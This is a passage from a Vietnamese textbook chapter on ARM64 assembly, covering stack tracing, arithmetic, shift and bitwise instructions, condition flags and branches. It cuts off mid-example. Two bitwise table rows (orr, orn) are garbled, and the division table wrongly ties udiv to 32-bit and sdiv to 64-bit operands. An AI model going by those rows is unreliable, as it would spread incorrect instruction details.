Hãy nhớ rằng mỗi khi một chương trình được thực thi, hệ điều hành sẽ cấp phát <strong>address space</strong> (không gian địa chỉ) mới cho chương trình đó (còn gọi là <strong>virtual memory</strong> — bộ nhớ ảo). Khái niệm virtual memory và khái niệm liên quan là <a href="C9-ARM64/../C13-OS/processes.html#_processes">process</a> sẽ được trình bày chi tiết hơn ở Chương 13; hiện tại, bạn chỉ cần hiểu rằng <strong>process</strong> là sự trừu tượng hóa của một chương trình đang chạy, và virtual memory là vùng bộ nhớ được cấp phát cho một process.</p>
<p>Mỗi process có một vùng bộ nhớ riêng gọi là <strong>call stack</strong>. Lưu ý rằng call stack nằm trong vùng process/virtual memory, khác với các thanh ghi (register) vốn nằm trong CPU.</p>
<p><strong>Hình 2</strong> mô tả trạng thái mẫu của call stack và các thanh ghi trước khi thực thi hàm <code>adder2</code>.</p>
<p><img src="C9-ARM64/_images/ex1_1.png" alt="frame1" /></p>
<p><strong>Hình 2.</strong> Execution stack trước khi thực thi</p>
<p>Hãy chú ý rằng stack phát triển về phía <em>địa chỉ thấp hơn</em>. Tham số truyền vào hàm <code>adder2</code> (hay <code>a</code>) theo quy ước được lưu trong thanh ghi <code>x0</code>. Vì <code>a</code> có kiểu <code>int</code>, nó được lưu trong <em>component register</em> <code>w0</code>, như thể hiện trong Hình 2. Tương tự, vì hàm <code>adder2</code> trả về một giá trị kiểu <code>int</code>, nên <em>component register</em> <code>w0</code> cũng được dùng để chứa giá trị trả về thay vì <code>x0</code>.</p>
<p>Các địa chỉ gắn với các lệnh trong <strong>code segment</strong> của program memory đã được rút gọn thành 0x724–0x738 để hình minh họa dễ đọc hơn. Tương tự, các địa chỉ gắn với <strong>call stack segment</strong> đã được rút gọn thành 0xe40–0xe50 từ dải địa chỉ thực tế 0xffffffffee40 đến 0xffffffffee50. Thực tế, địa chỉ của call stack nằm ở vùng địa chỉ cao hơn nhiều so với địa chỉ của code segment.</p>
<p>Hãy chú ý đến giá trị ban đầu của các thanh ghi <code>sp</code> và <code>pc</code>: lần lượt là 0xe50 và 0x724. Thanh ghi <code>pc</code> (<strong>program counter</strong>) cho biết lệnh tiếp theo sẽ được thực thi, và địa chỉ 0x724 tương ứng với lệnh đầu tiên trong hàm <code>adder2</code>. Mũi tên đỏ (góc trên bên trái) trong các hình tiếp theo biểu thị trực quan lệnh đang được thực thi.</p>
<p><img src="C9-ARM64/_images/ex1_2.png" alt="frame2" /></p>
<p>Lệnh đầu tiên (<code>sub sp, sp, #0x10</code>) trừ hằng số 0x10 khỏi giá trị của stack pointer, và cập nhật <code>sp</code> với kết quả mới. Vì <code>sp</code> chứa địa chỉ đỉnh stack, thao tác này sẽ <em>mở rộng</em> stack thêm 16 byte. Lúc này <code>sp</code> chứa địa chỉ 0xe40, trong khi thanh ghi <code>pc</code> chứa địa chỉ của lệnh tiếp theo sẽ thực thi, tức 0x728.</p>
<p><img src="C9-ARM64/_images/ex1_3.png" alt="frame3" /></p>
<p>Hãy nhớ rằng lệnh <code>str</code> <em>lưu trữ</em> giá trị từ một thanh ghi vào bộ nhớ. Do đó, lệnh tiếp theo (<code>str w0, [sp, #12]</code>) sẽ đặt giá trị trong <code>w0</code> (giá trị của <code>a</code>, tức 0x28) vào vị trí trên call stack tại <code>sp + 12</code>, tức 0xe4c. Lưu ý rằng lệnh này không thay đổi nội dung của thanh ghi <code>sp</code>; nó chỉ lưu một giá trị lên call stack. Sau khi lệnh này thực thi, <code>pc</code> tăng lên địa chỉ của lệnh tiếp theo, tức 0x72c.</p>
<p><img src="C9-ARM64/_images/ex1_4.png" alt="frame4" /></p>
<p>Tiếp theo, lệnh <code>ldr w0, [sp, #12]</code> được thực thi. Hãy nhớ rằng <code>ldr</code> <em>nạp</em> giá trị từ bộ nhớ vào một thanh ghi. Khi thực thi lệnh này, CPU thay thế giá trị trong <code>w0</code> bằng giá trị tại địa chỉ <code>sp + 12</code> trên stack. Mặc dù thao tác này có vẻ dư thừa (0x28 được thay bằng 0x28), nhưng nó thể hiện một quy ước: compiler thường lưu tham số hàm vào call stack để dùng sau, rồi nạp lại vào thanh ghi khi cần. Một lần nữa, giá trị trong <code>sp</code> không bị ảnh hưởng bởi thao tác <code>str</code>. Với chương trình, “đỉnh” stack vẫn là 0xe40. Sau khi lệnh <code>ldr</code> thực thi, <code>pc</code> tăng lên 0x730.</p>
<p><img src="C9-ARM64/_images/ex1_5.png" alt="frame5" /></p>
<p>Sau đó, lệnh <code>add w0, w0, #0x2</code> được thực thi. Hãy nhớ rằng lệnh <code>add</code> có dạng <code>add D, O1, O2</code> và đặt kết quả O1 + O2 vào thanh ghi đích D. Vì vậy, <code>add w0, w0, #0x2</code> cộng hằng số 0x2 vào giá trị trong <code>w0</code> (0x28), kết quả là 0x2A được lưu vào <code>w0</code>. Thanh ghi <code>pc</code> tăng lên địa chỉ lệnh tiếp theo, tức 0x734.</p>
<p><img src="C9-ARM64/_images/ex1_6.png" alt="frame6" /></p>
<p>Lệnh tiếp theo là <code>add sp, sp, #0x10</code>. Lệnh này cộng 16 byte vào địa chỉ trong <code>sp</code>. Vì stack phát triển về phía địa chỉ thấp, việc cộng 16 byte vào <code>sp</code> sẽ <em>thu nhỏ</em> stack, đưa <code>sp</code> trở lại giá trị ban đầu là 0xe50. Thanh ghi <code>pc</code> sau đó tăng lên 0x738.</p>
<p>Hãy nhớ rằng mục đích của call stack là lưu trữ dữ liệu tạm thời mà mỗi hàm sử dụng khi thực thi trong ngữ cảnh của một chương trình lớn hơn. Theo quy ước, stack sẽ “mở rộng” ở đầu hàm và trở lại trạng thái ban đầu khi hàm kết thúc. Do đó, thường thấy cặp lệnh <code>sub sp, sp, #v</code> (v là hằng số) ở đầu hàm và <code>add sp, sp, #v</code> ở cuối hàm.</p>
<p><img src="C9-ARM64/_images/ex1_7.png" alt="frame7" /></p>
<p>Lệnh cuối cùng là <code>ret</code>. Chúng ta sẽ nói kỹ hơn về <code>ret</code> trong các phần sau khi bàn về lời gọi hàm, nhưng hiện tại chỉ cần biết rằng <code>ret</code> chuẩn bị call stack để trả về từ một hàm. Theo quy ước, thanh ghi <code>x0</code> luôn chứa giá trị trả về (nếu có). Trong trường hợp này, vì <code>adder2</code> có kiểu trả về <code>int</code>, giá trị trả về được lưu trong <em>component register</em> <code>w0</code>, và hàm trả về giá trị 0x2A, tức 42.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="93-các-lệnh-số-học-arithmetic-instructions"><a class="header" href="#93-các-lệnh-số-học-arithmetic-instructions">9.3. Các lệnh số học (Arithmetic Instructions)</a></h2>
<h3 id="931-các-lệnh-số-học-thông-dụng-common-arithmetic-instructions"><a class="header" href="#931-các-lệnh-số-học-thông-dụng-common-arithmetic-instructions">9.3.1. Các lệnh số học thông dụng (Common Arithmetic Instructions)</a></h3>
<p><strong>A64 ISA</strong> (Instruction Set Architecture — “kiến trúc tập lệnh”) triển khai một số lệnh tương ứng với các phép toán số học được thực hiện bởi <strong>ALU</strong> (Arithmetic Logic Unit — “bộ số học và logic”). <a href="C9-ARM64/arithmetic.html#OtherArithmetica64">Bảng 1</a> liệt kê một số lệnh số học thường gặp khi đọc code Assembly của ARM.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>add D, O1, O2</code></td><td>D = O1 + O2</td></tr>
<tr><td><code>sub D, O1, O2</code></td><td>D = O1 - O2</td></tr>
<tr><td><code>neg D, O1</code></td><td>D = -(O1)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh số học thông dụng</p>
<p>Lệnh <code>add</code> và <code>sub</code> tương ứng với phép cộng và phép trừ, yêu cầu hai toán hạng ngoài thanh ghi đích. Ngược lại, lệnh <code>neg</code> chỉ yêu cầu một toán hạng ngoài thanh ghi đích.</p>
<p>Ba lệnh trong Bảng 1 cũng có các dạng <em>carry</em> cho phép lệnh sử dụng cờ điều kiện <strong>carry</strong> tùy chọn, <code>C</code>. Cờ carry là một bit được đặt khi một phép toán không dấu bị tràn. Chúng ta sẽ đề cập đến các cờ điều kiện khác ở phần tiếp theo, nhưng ở đây mô tả cờ carry để giới thiệu các lệnh số học bổ sung. Các dạng carry và bản dịch tương ứng được thể hiện trong Bảng 2.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>adc D, O1, O2</code></td><td>D = O1 + O2 + <code>C</code></td></tr>
<tr><td><code>sbc D, O1, O2</code></td><td>D = O1 - O2 - <code>~C</code></td></tr>
<tr><td><code>ngc D, O1</code></td><td>D = -(O1) - <code>~C</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các dạng carry của các lệnh số học thông dụng</p>
<p>Các lệnh trên cũng có hậu tố tùy chọn <code>s</code>. Khi hậu tố <code>s</code> được sử dụng (ví dụ: <code>adds</code>), nó cho biết phép toán số học sẽ thiết lập các cờ điều kiện.</p>
<h4 id="phép-nhân-và-phép-chia-multiplication-and-division"><a class="header" href="#phép-nhân-và-phép-chia-multiplication-and-division">Phép nhân và phép chia (Multiplication and Division)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>mul D, O1, O2</code></td><td>D = O1 × O2</td></tr>
<tr><td><code>udiv D, O1, O2</code></td><td>D = O1 / O2 (32-bit unsigned)</td></tr>
<tr><td><code>sdiv D, O1, O2</code></td><td>D = O1 / O2 (64-bit signed)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh nhân và chia thông dụng</p>
<p>Các lệnh nhân và chia thông dụng được thể hiện trong Bảng 3. Lệnh <code>mul</code> hoạt động trên hai toán hạng và đặt tích vào thanh ghi đích D. Phép chia <strong>không</strong> có dạng tổng quát; <code>udiv</code> và <code>sdiv</code> lần lượt hoạt động trên dữ liệu 32-bit và 64-bit. Lưu ý rằng bạn không thể nhân thanh ghi 32-bit với thanh ghi 64-bit.</p>
<p>Ngoài ra, <strong>ARMv8-A</strong> cung cấp các dạng nhân hợp thành (composite forms), cho phép CPU thực hiện các phép toán phức tạp hơn trong một lệnh duy nhất. Các lệnh này được thể hiện trong <a href="C9-ARM64/arithmetic.html#CompositeMultiply">Bảng 4</a>.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>madd D, O1, O2, O3</code></td><td>D = O3 + (O1 × O2)</td></tr>
<tr><td><code>msub D, O1, O2, O3</code></td><td>D = O3 - (O1 × O2)</td></tr>
<tr><td><code>mneg D, O1, O2</code></td><td>D = -(O1 × O2)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Các lệnh nhân hợp thành</p>
<h3 id="932-các-lệnh-dịch-bit-bit-shifting-instructions"><a class="header" href="#932-các-lệnh-dịch-bit-bit-shifting-instructions">9.3.2. Các lệnh dịch bit (Bit Shifting Instructions)</a></h3>
<p>Các lệnh dịch bit cho phép <strong>compiler</strong> (trình biên dịch) thực hiện các phép dịch bit. Các lệnh nhân và chia thường mất nhiều thời gian để thực thi. Dịch bit mang lại cho compiler một cách tối ưu hơn khi nhân hoặc chia với các số là lũy thừa của 2. Ví dụ, để tính <code>77 * 4</code>, hầu hết compiler sẽ dịch phép toán này thành <code>77 &lt;&lt; 2</code> để tránh sử dụng lệnh <code>mul</code>. Tương tự, để tính <code>77 / 4</code>, compiler thường dịch thành <code>77 &gt;&gt; 2</code> để tránh dùng lệnh <code>sdiv</code>.</p>
<p>Cần lưu ý rằng dịch bit sang trái và sang phải sẽ được dịch thành các lệnh khác nhau tùy thuộc vào mục tiêu là dịch số học (signed) hay dịch logic (unsigned).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th><th>Arithmetic or Logical?</th></tr></thead><tbody>
<tr><td><code>lsl D, R, #v</code></td><td>D = R <code>&lt;&lt;</code> v</td><td>logical hoặc arithmetic</td></tr>
<tr><td><code>lsr D, R, #v</code></td><td>D = R <code>&gt;&gt;</code> v</td><td>logical</td></tr>
<tr><td><code>asr D, R, #v</code></td><td>D = R <code>&gt;&gt;</code> v</td><td>arithmetic</td></tr>
<tr><td><code>ror D, R, #v</code></td><td>D = R <code>&gt;&gt;&gt;</code> v</td><td>neither (rotate)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 5.</strong> Các lệnh dịch bit</p>
<p>Ngoài thanh ghi đích, mỗi lệnh dịch bit nhận hai toán hạng; một thường là thanh ghi (ký hiệu R) và một là giá trị dịch 6-bit (v). Trên hệ thống 64-bit, giá trị dịch được code hóa thành một byte (vì không có ý nghĩa khi dịch quá 63 bit). Giá trị dịch v phải là hằng số hoặc được lưu trong một thanh ghi thành phần.</p>
<p>Lệnh dịch bit cuối cùng, <code>ror</code>, cần được thảo luận riêng. Lệnh <code>ror</code> <em>xoay</em> các bit, thay thế các bit có trọng số lớn nhất bằng các bit có trọng số nhỏ nhất. Chúng ta ký hiệu phép xoay bit này bằng ký hiệu <code>&gt;&gt;&gt;</code>.</p>
<blockquote>
<p><strong>Các phiên bản khác nhau của lệnh giúp chúng ta phân biệt kiểu dữ liệu ở mức assembly</strong></p>
<p>Ở mức assembly, không tồn tại khái niệm <em>type</em> (kiểu dữ liệu). Tuy nhiên, hãy nhớ rằng <strong>compiler</strong> (trình biên dịch) có thể chọn sử dụng các <em>component register</em> (thanh ghi thành phần) dựa trên kiểu dữ liệu xuất hiện ở mức mã nguồn. Tương tự, hãy nhớ rằng phép dịch phải (<em>shift right</em>) hoạt động khác nhau tùy thuộc vào việc giá trị là <strong>signed</strong> (có dấu) hay <strong>unsigned</strong> (không dấu). Ở mức assembly, compiler sử dụng các lệnh riêng biệt để phân biệt giữa dịch logic (<em>logical shift</em>) và dịch số học (<em>arithmetic shift</em>).</p>
</blockquote>
<h3 id="933-các-lệnh-thao-tác-bit-bitwise-instructions"><a class="header" href="#933-các-lệnh-thao-tác-bit-bitwise-instructions">9.3.3. Các lệnh thao tác bit (Bitwise Instructions)</a></h3>
<p><strong>Bitwise instruction</strong> cho phép compiler thực hiện các phép toán bit trên dữ liệu. Một cách mà compiler sử dụng phép toán bit là để tối ưu hóa trong một số trường hợp. Ví dụ, compiler có thể chọn thực hiện <code>77 mod 4</code> bằng phép toán <code>77 &amp; 3</code> thay vì sử dụng lệnh <code>sdiv</code> vốn tốn kém hơn.</p>
<p>Bảng 6 liệt kê các lệnh bitwise thông dụng và các lệnh bitwise hợp thành (<em>composite</em>) có sử dụng phép phủ định (<em>negation</em>).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>and D, O1, O2</code></td><td>D = O1 <code>&amp;</code> O2</td></tr>
<tr><td><code>orr D, O1, O2</code></td><td>D = O1 `</td></tr>
<tr><td><code>eor D, O1, O2</code></td><td>D = O1 <code>^</code> O2</td></tr>
<tr><td><code>mvn D, O</code></td><td>D = <code>~</code>O</td></tr>
<tr><td><code>bic D, O1, O2</code></td><td>D = O1 <code>&amp;</code> <code>~</code>O2</td></tr>
<tr><td><code>orn D, O1, O2</code></td><td>D = O1 `</td></tr>
<tr><td><code>eon D, O1, O2</code></td><td>D = O1 <code>^</code> <code>~</code>O2</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 6.</strong> Các phép toán bitwise</p>
<p>Hãy nhớ rằng <strong>bitwise not</strong> khác với phép <strong>negation</strong> (<code>neg</code>). Lệnh <code>mvn</code> đảo tất cả các bit của toán hạng nhưng <strong>không</strong> cộng thêm 1. Cần cẩn thận để không nhầm lẫn hai lệnh này.</p>
<blockquote>
<p><strong>Chỉ sử dụng phép toán bitwise khi thực sự cần trong code C của bạn!</strong></p>
<p>Sau khi đọc phần này, bạn có thể sẽ muốn thay thế các phép toán số học thông thường trong code C của mình bằng các phép dịch bit hoặc các phép toán bit khác. Điều này <strong>không</strong> được khuyến khích. Hầu hết các compiler hiện đại đủ thông minh để thay thế các phép toán số học đơn giản bằng các phép toán bit khi điều đó hợp lý, vì vậy lập trình viên không cần phải tự làm điều đó. Nguyên tắc chung là lập trình viên nên ưu tiên <strong>tính dễ đọc của code</strong> bất cứ khi nào có thể và tránh tối ưu hóa sớm (<em>premature optimization</em>).</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="94-conditional-control-and-loops"><a class="header" href="#94-conditional-control-and-loops">9.4. Conditional Control and Loops</a></h2>
<p>Phần này trình bày các lệnh assembly cho <a href="C9-ARM64/../C1-C_intro/conditionals.html#_conditionals_and_loops">câu lệnh điều kiện và vòng lặp</a>.<br />
Hãy nhớ rằng câu lệnh điều kiện cho phép lập trình viên thay đổi luồng thực thi chương trình dựa trên kết quả của một biểu thức điều kiện. Compiler sẽ dịch các câu lệnh điều kiện thành các lệnh assembly thay đổi <strong>instruction pointer</strong> (<code>pc</code>) để trỏ tới một địa chỉ <strong>không</strong> phải là địa chỉ kế tiếp trong chuỗi lệnh của chương trình.</p>
<ul>
<li>9.4.1. Preliminaries</li>
<li><a href="C9-ARM64/if_statements.html">9.4.2. If Statements in Assembly</a></li>
<li>9.4.3. Loops in Assembly  </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h3 id="941-kiến-thức-cơ-bản-preliminaries"><a class="header" href="#941-kiến-thức-cơ-bản-preliminaries">9.4.1. Kiến thức cơ bản (Preliminaries)</a></h3>
<h3 id="lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions"><a class="header" href="#lệnh-so-sánh-có-điều-kiện-conditional-comparison-instructions">Lệnh so sánh có điều kiện (Conditional Comparison Instructions)</a></h3>
<p>Các lệnh so sánh thực hiện một phép toán số học nhằm phục vụ cho việc điều khiển thực thi có điều kiện của chương trình.<br />
<strong><a href="C9-ARM64/preliminaries.html#ConditionalControla64">Bảng 1</a></strong> liệt kê các lệnh cơ bản liên quan đến điều khiển có điều kiện.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>cmp O1, O2</code></td><td>So sánh O1 với O2 (tính O1 - O2)</td></tr>
<tr><td><code>tst O1, O2</code></td><td>Tính O1 <code>&amp;</code> O2</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh điều khiển có điều kiện</p>
<p>Lệnh <code>cmp</code> so sánh giá trị của hai toán hạng O1 và O2, cụ thể là trừ O2 khỏi O1.<br />
Lệnh <code>tst</code> thực hiện phép <strong>bitwise AND</strong>. Một ví dụ thường gặp:</p>
<pre><code>tst x0, x0
</code></pre>
<p>Trong ví dụ này, phép AND bitwise của <code>x0</code> với chính nó chỉ cho kết quả bằng 0 khi <code>x0</code> chứa giá trị 0.<br />
Nói cách khác, đây là phép kiểm tra giá trị bằng 0, tương đương với:</p>
<pre><code>cmp x0, #0
</code></pre>
<p>Không giống như các lệnh số học đã đề cập trước đó, <code>cmp</code> và <code>tst</code> <strong>không</strong> ghi kết quả vào một thanh ghi đích.<br />
Thay vào đó, cả hai lệnh này sẽ thay đổi một tập hợp các giá trị 1-bit gọi là <strong>condition code flags</strong>.</p>
<p>Ví dụ, <code>cmp</code> sẽ thay đổi các cờ điều kiện dựa trên việc phép tính O1 - O2 cho kết quả dương (lớn hơn), âm (nhỏ hơn) hoặc bằng 0 (bằng nhau).<br />
Hãy nhớ rằng <a href="C9-ARM64/../C5-Arch/cpu.html#_the_alu">condition code</a> lưu trữ thông tin về một phép toán trong ALU.<br />
Các cờ điều kiện là một phần của trạng thái bộ xử lý ARM (<code>PSTATE</code>), thay thế cho thanh ghi trạng thái chương trình hiện tại (<code>CPSR</code>) trong hệ ARMv7-A.</p>
<div class="table-wrapper"><table><thead><tr><th>Flag</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>Z</code></td><td>Bằng 0 (1: đúng, 0: sai)</td></tr>
<tr><td><code>N</code></td><td>Âm (1: đúng, 0: sai)</td></tr>
<tr><td><code>V</code></td><td>Xảy ra tràn số có dấu (1: có, 0: không)</td></tr>
<tr><td><code>C</code></td><td>Xảy ra carry số học / tràn số không dấu (1: có, 0: không)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các cờ điều kiện thường dùng</p>
<p>Xét lại lệnh <code>cmp O1, O2</code>:</p>
<ul>
<li>Cờ <code>Z</code> được đặt thành 1 nếu O1 và O2 bằng nhau.</li>
<li>Cờ <code>N</code> được đặt thành 1 nếu O1 <em>nhỏ hơn</em> O2 (tức O1 - O2 cho kết quả âm).</li>
<li>Cờ <code>V</code> được đặt thành 1 nếu phép O1 - O2 gây tràn số (hữu ích cho so sánh có dấu).</li>
<li>Cờ <code>C</code> được đặt thành 1 nếu phép O1 - O2 gây carry số học (hữu ích cho so sánh không dấu).</li>
</ul>
<p>Việc tìm hiểu sâu về các cờ điều kiện nằm ngoài phạm vi của sách này, nhưng cần lưu ý rằng việc <code>cmp</code> và <code>tst</code> thiết lập các cờ này cho phép các lệnh tiếp theo (lệnh <em>branch</em>) hoạt động chính xác.</p>
<h3 id="lệnh-nhánh-the-branch-instructions"><a class="header" href="#lệnh-nhánh-the-branch-instructions">Lệnh nhánh (The Branch Instructions)</a></h3>
<p>Lệnh nhánh cho phép chương trình “nhảy” tới một vị trí mới trong code lệnh.<br />
Trong các chương trình assembly mà ta đã phân tích, <code>pc</code> luôn trỏ tới lệnh kế tiếp trong bộ nhớ chương trình.<br />
Lệnh nhánh cho phép <code>pc</code> được đặt tới một lệnh mới chưa thực thi (như trong câu lệnh <code>if</code>) hoặc tới một lệnh đã thực thi trước đó (như trong vòng lặp).</p>
<h4 id="lệnh-nhánh-trực-tiếp-direct-branch-instructions"><a class="header" href="#lệnh-nhánh-trực-tiếp-direct-branch-instructions">Lệnh nhánh trực tiếp (Direct branch instructions)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Description</th></tr></thead><tbody>
<tr><td><code>b addr L</code></td><td><code>pc</code> = addr</td></tr>
<tr><td><code>br A</code></td><td><code>pc</code> = A</td></tr>
<tr><td><code>cbz R, addr L</code></td><td>Nếu R bằng 0, <code>pc</code> = addr (nhánh có điều kiện)</td></tr>
<tr><td><code>cbnz R, addr L</code></td><td>Nếu R khác 0, <code>pc</code> = addr (nhánh có điều kiện)</td></tr>
<tr><td><code>b.c addr L</code></td><td>Nếu điều kiện c đúng, <code>pc</code> = addr (nhánh có điều kiện)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Các lệnh nhánh thường dùng</p>
<p><strong>Bảng 3</strong> liệt kê tập hợp các lệnh nhánh thường dùng; trong đó <code>L</code> là một <strong>symbolic label</strong> (nhãn ký hiệu), đóng vai trò như một định danh trong tệp đối tượng (object file) của chương trình.<br />
Tất cả các nhãn đều bao gồm một số chữ cái và chữ số, theo sau là dấu hai chấm.<br />
Nhãn có thể là <em>local</em> (cục bộ) hoặc <em>global</em> (toàn cục) trong phạm vi của một tệp đối tượng.</p>
<ul>
<li>Nhãn của hàm thường là <em>global</em> và thường bao gồm tên hàm kèm dấu hai chấm. Ví dụ: <code>main:</code> (hoặc <code>&lt;main&gt;:</code>) được dùng để đánh dấu hàm <code>main</code> do người dùng định nghĩa.</li>
<li>Theo quy ước, các nhãn có phạm vi <em>local</em> thường được đặt dấu chấm ở đầu. Bạn có thể bắt gặp một nhãn local như <code>.L1</code> trong ngữ cảnh của một câu lệnh <code>if</code> hoặc vòng lặp.</li>
</ul>
<p>Mỗi nhãn đều có một địa chỉ liên kết (<code>addr</code> trong Bảng 3).<br />
Khi CPU thực thi lệnh <code>b</code>, nó sẽ đặt thanh ghi <code>pc</code> thành <code>addr</code>.<br />
Lệnh <code>b</code> cho phép bộ đếm chương trình (program counter) thay đổi trong phạm vi 128 MB so với vị trí hiện tại.<br />
Người lập trình assembly cũng có thể chỉ định một địa chỉ cụ thể để nhảy tới bằng lệnh <code>br</code>.<br />
Không giống <code>b</code>, lệnh <code>br</code> không bị giới hạn về phạm vi địa chỉ.</p>
<p>Đôi khi, các nhãn local cũng được hiển thị dưới dạng offset so với điểm bắt đầu của một hàm.<br />
Ví dụ, một lệnh nằm cách điểm bắt đầu của <code>main</code> 28 byte có thể được biểu diễn bằng nhãn <code>&lt;main+28&gt;</code>.<br />
Lệnh <code>b 0x7d0 &lt;main+28&gt;</code> nghĩa là nhảy tới địa chỉ <code>0x7d0</code>, nhãn <code>&lt;main+28&gt;</code>, tức là cách điểm bắt đầu của hàm <code>main</code> 28 byte.<br />
Khi thực thi lệnh này, <code>pc</code> sẽ được đặt thành <code>0x7d0</code>.</p>
<p>Ba lệnh cuối trong Bảng 3 là <strong>conditional branch instructions</strong> (lệnh nhánh có điều kiện).<br />
Nói cách khác, thanh ghi <code>pc</code> chỉ được đặt thành <code>addr</code> nếu điều kiện cho trước được đánh giá là đúng.</p>
<ul>
<li>Với <code>cbz</code>, nếu thanh ghi R bằng 0, nhánh sẽ được thực hiện và <code>pc</code> được đặt thành <code>addr</code>.</li>
<li>Với <code>cbnz</code>, nếu thanh ghi R khác 0, nhánh sẽ được thực hiện và <code>pc</code> được đặt thành <code>addr</code>.</li>
</ul>
<p>Mạnh mẽ nhất trong các lệnh nhánh có điều kiện là <code>b.c</code>, cho phép compiler hoặc lập trình viên assembly chọn một hậu tố (suffix) tùy chỉnh để chỉ ra điều kiện thực hiện nhánh.</p>
<h4 id="hậu-tố-lệnh-nhánh-có-điều-kiện-conditional-branch-instruction-suffixes"><a class="header" href="#hậu-tố-lệnh-nhánh-có-điều-kiện-conditional-branch-instruction-suffixes">Hậu tố lệnh nhánh có điều kiện (Conditional branch instruction suffixes)</a></h4>
<p><strong>Bảng 4</strong> liệt kê các hậu tố nhánh có điều kiện thường gặp (ký hiệu <code>c</code>).<br />
Khi dùng với lệnh nhánh, mỗi lệnh bắt đầu bằng chữ <code>b</code> và dấu chấm, biểu thị đây là lệnh nhánh.<br />
Hậu tố <code>c</code> chỉ ra <strong>điều kiện</strong> để thực hiện nhánh.<br />
Các hậu tố này cũng xác định việc so sánh số sẽ được hiểu là có dấu (signed) hay không dấu (unsigned).</p>
<p>Lưu ý: lệnh nhánh có điều kiện có phạm vi ngắn hơn nhiều (1 MB) so với lệnh <code>b</code>.<br />
Những hậu tố này cũng được dùng cho lệnh <strong>conditional select</strong> (<code>csel</code>), sẽ được đề cập ở phần tiếp theo.</p>
<div class="table-wrapper"><table><thead><tr><th>Signed Comparison</th><th>Unsigned Comparison</th><th>Mô tả</th></tr></thead><tbody>
<tr><td><code>eq</code></td><td><code>eq</code></td><td>Nhảy nếu bằng nhau (==) hoặc nếu bằng 0</td></tr>
<tr><td><code>ne</code></td><td><code>ne</code></td><td>Nhảy nếu khác nhau (!=)</td></tr>
<tr><td><code>mi</code></td><td><code>mi</code></td><td>Nhảy nếu âm (negative)</td></tr>
<tr><td><code>pl</code></td><td><code>pl</code></td><td>Nhảy nếu không âm (&gt;= 0)</td></tr>
<tr><td><code>gt</code></td><td><code>hi</code></td><td>Nhảy nếu lớn hơn (&gt;) / cao hơn (higher)</td></tr>
<tr><td><code>ge</code></td><td><code>cs</code> (<code>hs</code>)</td><td>Nhảy nếu lớn hơn hoặc bằng (&gt;=)</td></tr>
<tr><td><code>lt</code></td><td><code>lo</code> (<code>cc</code>)</td><td>Nhảy nếu nhỏ hơn (&lt;)</td></tr>
<tr><td><code>le</code></td><td><code>ls</code></td><td>Nhảy nếu nhỏ hơn hoặc bằng (&lt;=)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 4.</strong> Hậu tố lệnh nhánh có điều kiện (các từ đồng nghĩa được ghi trong ngoặc)</p>
<h3 id="câu-lệnh-goto-2"><a class="header" href="#câu-lệnh-goto-2">Câu lệnh goto</a></h3>
<p>Trong các phần tiếp theo, chúng ta sẽ xem xét các câu lệnh điều kiện và vòng lặp trong assembly và dịch ngược chúng về C.<br />
Khi dịch ngược code assembly của các câu lệnh điều kiện và vòng lặp về C, việc hiểu dạng <code>goto</code> tương ứng trong C là rất hữu ích.</p>
<p>Câu lệnh <code>goto</code> là một primitive trong C, buộc chương trình chuyển luồng thực thi sang một dòng khác trong code.<br />
Lệnh assembly tương ứng với <code>goto</code> là <code>b</code>.</p>
<p>Cú pháp <code>goto</code> gồm từ khóa <code>goto</code> theo sau là một <strong>goto label</strong> — một loại nhãn chương trình chỉ ra rằng việc thực thi sẽ tiếp tục tại vị trí được đánh dấu bởi nhãn đó.<br />
Ví dụ: <code>goto done</code> nghĩa là chương trình sẽ nhảy tới dòng có nhãn <code>done</code>.</p>
<p>Các ví dụ khác về nhãn trong C bao gồm nhãn của câu lệnh <a href="C9-ARM64/../C2-C_depth/advanced_switch.html#_c_switch_stmt_">switch</a> đã được đề cập ở Chương 2.</p>
<p>Các đoạn code dưới đây minh họa hàm <code>getSmallest</code> được viết bằng C thông thường (bên trái) và dạng <code>goto</code> tương ứng trong C (bên phải).<br />
Hàm <code>getSmallest</code> so sánh giá trị của hai số nguyên (<code>x</code> và <code>y</code>), và gán giá trị nhỏ hơn cho biến <code>smallest</code>.</p>
<h4 id="phiên-bản-c-thông-thường-1"><a class="header" href="#phiên-bản-c-thông-thường-1">Phiên bản C thông thường</a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;

    if ( x &gt; y ) { // if (conditional)
        smallest = y; // then statement
    }
    else {
        smallest = x; // else statement
    }
    return smallest;
}
</code></pre>
<h4 id="phiên-bản-dùng-goto-1"><a class="header" href="#phiên-bản-dùng-goto-1">Phiên bản dùng goto</a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;

    if (x &lt;= y) { // if (!conditional)
        goto else_statement;
    }

